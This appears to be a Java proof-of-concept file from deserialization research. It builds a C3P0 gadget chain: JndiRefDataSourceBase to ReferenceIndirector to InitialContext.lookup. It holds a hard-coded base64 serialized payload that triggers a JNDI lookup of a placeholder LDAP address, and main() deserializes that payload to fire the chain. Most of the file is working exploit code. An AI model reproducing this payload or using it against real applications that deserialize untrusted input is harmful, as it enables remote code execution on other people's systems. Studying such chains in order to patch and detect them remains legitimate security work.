package com.example.C3P0;

import com.example.Utils.Encoder;
import com.example.Utils.SerializeUtil;
import com.mchange.v2.naming.ReferenceIndirector;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class POC_2 {

    /***
     * <com.mchange.v2.c3p0.impl.JndiRefDataSourceBase: void readObject(java.io.ObjectInputStream)>
     * <com.mchange.v2.naming.ReferenceIndirector: java.lang.Object getObject()>
     * <javax.naming.InitialContext: java.lang.Object lookup(javax.naming.Name)>
     */

    public static void main(String[] args) throws Exception {
//        JndiRefDataSourceBase b = new JndiRefDataSourceBase(false); // 修改了源码从而生成payload
//        b.setJndiName(new PoolSource());
//        System.out.println(Encoder.encodeBase64(SerializeUtil.serialize(b)));
        String payload = "rO0ABXNyAC5jb20ubWNoYW5nZS52Mi5jM3AwLmltcGwuSm5kaVJlZkRhdGFTb3VyY2VCYXNlAAAAAAAAAAEDAAdaAAdjYWNoaW5nTAAUZmFjdG9yeUNsYXNzTG9jYXRpb250ABJMamF2YS9sYW5nL1N0cmluZztMAA1pZGVudGl0eVRva2VucQB+AAFMAAdqbmRpRW52dAAVTGphdmEvdXRpbC9IYXNodGFibGU7TAAIam5kaU5hbWV0ABJMamF2YS9sYW5nL09iamVjdDtMAANwY3N0ACJMamF2YS9iZWFucy9Qcm9wZXJ0eUNoYW5nZVN1cHBvcnQ7TAADdmNzdAAiTGphdmEvYmVhbnMvVmV0b2FibGVDaGFuZ2VTdXBwb3J0O3hwdwMAAQFwcHBzcgA9Y29tLm1jaGFuZ2UudjIubmFtaW5nLlJlZmVyZW5jZUluZGlyZWN0b3IkUmVmZXJlbmNlU2VyaWFsaXplZGIZhdDRKsITAgAETAALY29udGV4dE5hbWV0ABNMamF2YXgvbmFtaW5nL05hbWU7TAADZW52cQB+AAJMAARuYW1lcQB+AAhMAAlyZWZlcmVuY2V0ABhMamF2YXgvbmFtaW5nL1JlZmVyZW5jZTt4cHNyABlqYXZheC5uYW1pbmcuQ29tcG91bmROYW1lMMEKV+03kcQDAAB4cHNyABRqYXZhLnV0aWwuUHJvcGVydGllczkS0HpwNj6YAgABTAAIZGVmYXVsdHN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHIAE2phdmEudXRpbC5IYXNodGFibGUTuw8lIUrkuAMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAIdwgAAAALAAAAAHhwdwQAAAABdAAKbGRhcDovL3h4eHhwcHB4";
        SerializeUtil.deserialize(Encoder.decodeBase64(payload));
    }

    private static class PoolSource extends ReferenceIndirector implements ConnectionPoolDataSource, Referenceable {

        public PoolSource () {
        }

        @Override
        public Reference getReference() throws NamingException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

    }

}
